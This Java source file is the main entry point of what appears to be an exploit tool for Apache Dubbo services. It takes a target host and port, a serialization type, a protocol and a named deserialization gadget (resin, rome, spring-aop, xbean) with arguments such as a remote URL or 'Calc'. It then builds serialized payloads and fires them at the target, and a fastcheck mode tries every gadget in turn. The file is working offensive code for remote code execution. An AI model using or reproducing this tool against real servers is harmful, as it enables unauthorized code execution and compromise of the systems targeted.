package com.threedr3am.exp.dubbo;

import com.threedr3am.exp.dubbo.fastcheck.CheckDataCenter;
import com.threedr3am.exp.dubbo.payload.Payload;
import com.threedr3am.exp.dubbo.payload.Payloads;
import com.threedr3am.exp.dubbo.protocol.Protocol;
import com.threedr3am.exp.dubbo.protocol.Protocols;
import com.threedr3am.exp.dubbo.serialization.Serialization;
import com.threedr3am.exp.dubbo.serialization.Serializations;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.HelpFormatter;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;

/**
 * @author threedr3am
 */
public class Main {

  public static void main(String[] args) throws ParseException {
    Options options = new Options()
        .addOption("h","help", false, "帮助信息")
        .addOption("t", "target", true, "目标，例：-t 127.0.0.1:20880")
        .addOption("s", "serialization", true, "[hessian|java] 序列化类型")
        .addOption("p", "protocol", true, "[dubbo|http] 通讯协议名称，默认缺省dubbo")
        .addOption("g", "gadget", true, "gadget名称，hessian可选[resin|rome|spring-aop|xbean]，java可选[]")
        .addOption("a", "args", true, "gadget入参，多个参数，需要多个命令传入，例-a http://127.0.0.1:800/ -a Calc")
        .addOption("l", "list", false, "输出所有payload信息")
        .addOption("f", "fastcheck", true, "快速攻击检查（使用预置参数数据文件，遍历所有gadget进行攻击检查），参数为数据文件路径，参考文件check.data")
        ;

    //parser
    CommandLineParser parser = new DefaultParser();
    CommandLine cmd = parser.parse(options, args);

    String protocol = cmd.hasOption("protocol") ? cmd.getOptionValue("protocol") : "dubbo";
    String s = cmd.getOptionValue("serialization");

    if (cmd.hasOption("help")) {
      HelpFormatter formatter = new HelpFormatter();
      formatter.printHelp("java -jar exp.jar [OPTION]", options);
      return;
    }

    if (cmd.hasOption("list")) {
      Payloads[] payloads = Payloads.values();
      for (int i = 0; i < payloads.length; i++) {
        Payloads p = payloads[i];
        System.out.println("---------------------------------------------------------------------------------------------------------");
        System.out.println("1. 名称：" + p.getName());
        System.out.println("2. 需要入参数量：" + p.getParamSize());
        System.out.println("3. 参数说明：" + p.getParamTis());
        System.out.println("4. 序列化类型：" + p.getSerialization());
        System.out.println("5. 依赖：" + p.getDependency());
      }
      return;
    }

    if (!cmd.hasOption("target")) {
      System.err.println("目标不能为空，例：-t 127.0.0.1:20880");
      return;
    }

    String[] payloadArgs = cmd.getOptionValues("args");
    List<Payloads> payloadsList;
    if (cmd.hasOption("fastcheck")) {
      CheckDataCenter.initFastCheckData(cmd.getOptionValue("fastcheck"));
      payloadsList = Payloads.getPayloads(s);
    } else {
      if (payloadArgs != null && payloadArgs.length > 0) {
        Payloads payloadEnum = Payloads.getPayload(cmd.getOptionValue("gadget"), s);
        if (payloadEnum == null) {
          System.err.println("gadget[" + cmd.getOptionValue("gadget") + "]不存在");
          return;
        }
        if (payloadEnum.getParamSize() != payloadArgs.length) {
          System.err.println("gadget参数错误");
          System.err.println(payloadEnum.getParamTis());
          return;
        }
        payloadsList = new ArrayList();
        payloadsList.add(payloadEnum);
      } else {
        System.err.println("gadget参数值不能为空，你必须输入一点参数来使gadget可以使用");
        return;
      }
    }

    for (Payloads p:payloadsList) {
      Serialization serialization = Serializations.getSerialization(p.getSerialization());
      serialization.setPayload(p.getPayload());
      byte[] bytes = serialization.makeData(p.getPayload(), payloadArgs, protocol);

      String target = cmd.getOptionValue("target");
      String host = target;
      int port = 20880;
      String path = "/";
      int index = target.indexOf("/");
      if (index != -1) {
        path = target.substring(index);
        target = target.substring(0, index);
      }
      index = target.indexOf(":");
      if (index != -1) {
        host = target.substring(0, index);
        port = Integer.parseInt(target.substring(index + 1));
      }

      Protocol protocolImpl = Protocols.getProtocol(protocol);
      Map<String, String> extraData = protocolImpl.initExtraData(cmd);
      bytes = protocolImpl.makeData(bytes, serialization, extraData);

      new Exploit().attack(host, port, bytes);
    }
  }

}
